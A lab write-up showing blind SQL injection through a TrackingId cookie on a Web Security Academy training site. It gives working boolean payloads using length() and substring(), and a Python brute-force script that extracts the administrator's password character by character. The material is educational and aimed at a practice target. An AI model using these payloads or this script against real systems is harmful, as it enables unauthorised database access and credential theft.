# Blind SQL injection with conditional responses

In this lab we are going to exploit a blind SQL injection in the Cookie Header of the web request. Introduction of the lab environment implies that tracking cookie performs an sql query for analytics. If the result of the query is `True` than response will have "Welcome back!" message in the page. So before moving on forward let's take a look at the server response before performing any SQL query to the Cookie value. Also the objective of the lab is logging in to the panel as administrator

![image](https://user-images.githubusercontent.com/68084571/139441054-9f5fa8d1-c762-4d05-8990-a0f73eadd1cf.png)

After seeing the result of a successful result from the database let's just send the request to Burp and play with the request a little bit more. As can be seen putting a quote to the TrackingID cookie value, it breaks the SQL query and in response to that we don't get Welcome back!. However ending the cookie value with a simple comment `--` resolves the issue.

![image](https://user-images.githubusercontent.com/68084571/139441741-15413aab-6d1d-47ab-9994-0d3ec3f46c70.png)

![image](https://user-images.githubusercontent.com/68084571/139441959-5d8b7695-7c5b-43c2-a22c-a4b6a55e9c99.png)

So we do definetely have a valid SQL responses. Now let's just try to enumerate the `administrator` user as given in the description part of the lab. In order to achieve this I will use a second query that resolves the username.

Simply the query I will be sending to the Cookie value is going to be:
```sql
c69OqpZi2pw86km2' and (select username from users where username='administrator')='administrator'--
```
Since we sent a true statement result is as expected including the Welcome message.

![image](https://user-images.githubusercontent.com/68084571/139442645-7289e670-df43-48d3-a568-759a606f2715.png)

The next step we should consider is determining the password length of administrator account just to be sure how many characters are we going to brute force. I will be using `length()` function. To do that we can use Intruder or a simple bash / python script. All Burp is going to perform is basically bruteforce 1-26 by incrementing 1 to the marked field which is password length in our case.

```sql
TrackingId=c69OqpZi2pw86km2' and (select username from users where username='administrator' and length(password)=1)='administrator'--
```
![image](https://user-images.githubusercontent.com/68084571/139444143-96102ea4-d55e-480e-a2bd-bd30b3a180f5.png)

![image](https://user-images.githubusercontent.com/68084571/139444274-91187a3d-7f28-4a92-8bf7-68b0dda041e5.png)

We do have a different Length in the response when we hit 20 on the password length.

![image](https://user-images.githubusercontent.com/68084571/139444546-aa3e22f9-d4c9-47bc-adae-ceefbf8c976c.png)

To extract the password of the user we should perform a SQL query that will help us determine the characters in the password field 1 by 1. Otherwise this will be a normal brute force like we can perform on the login panel. Changing the query we sent;
```sql
c69OqpZi2pw86km2' and substring((select password from users where username='administrator'),1,1)='a'--
```

The query is going to send a request to database like, I am going to try only 1 character at a time and my first character is going to be `a`. This is determined by `SUBSTRING()` function which will serve like SUBSTRING(password,\<start value\>, \<length\>). In our case this will start from first character and try the length of 1. If we succeed than we will increment to second character for the length of 2.
```sql
c69OqpZi2pw86km2' and substring((select password from users where username='administrator'),2,1)='b'--
```
This will continue until we reach last char on the password field. We can accomplish this within the burpsuite, however since I am not using the Pro version, it will probably take too long to finish. So in an alternative way I will build a python script to brute force.
  
```python
#!/usr/bin/env python3
import requests
import string

def injection(args):
    url = 'https://ac4f1fda1eab6a73c0f0070200a100c6.web-security-academy.net/product?productId=1'
    r = requests.get(url, cookies=cookies)
    # If query result is True response will have Welcome back!
    if "Welcome" in r.text:
        return True

printable = string.printable
iteration = ''
for i in range(1,22):
    for char in printable:
        password = iteration + char
        print("\r",f'Password: {password}',flush=False,end="")
        cookies = {"TrackingId":f"c69OqpZi2pw86km2' and substring((select password FROM users where username='administrator'),{i},1)='{char}'-- -"}

        if injection(cookies):
            print("\r",iteration,flush=True,end="")
            iteration += char
            break

```
After getting the correct password of the user, trying to login on the panel and we see;

![image](https://user-images.githubusercontent.com/68084571/139453184-2f4e29a0-f179-43ac-a17a-00144130d44c.png)
  
  
  
